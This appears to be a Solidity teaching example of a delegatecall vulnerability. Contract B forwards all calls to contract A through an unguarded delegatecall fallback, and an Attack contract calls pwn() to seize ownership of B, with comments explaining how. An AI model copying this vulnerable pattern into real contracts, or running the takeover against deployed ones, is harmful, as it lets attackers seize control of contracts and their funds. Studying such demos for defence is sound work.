// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;


contract A{
    address public owner;

    function pwn()public{
        owner = msg.sender;
    }

}

contract B{
    address public owner;
    A public a;

    constructor(A _a){
        owner = msg.sender;
        a=A(_a);
    }

    fallback()external payable {
        address(a).delegatecall(msg.data);
    }

}


contract Attack{
    address public b;

    constructor(address _b){
        b = _b;
    }

    function attack()public{
        b.call(abi.encodeWithSignature("pwn()"));
        //will call pwn inside the contract B where it will not find that function selector ,
        //which will make it fallback where it will pass the the pwn function selector as the msg.data updating the owner 
        //of contract B to that of Attack
    }

}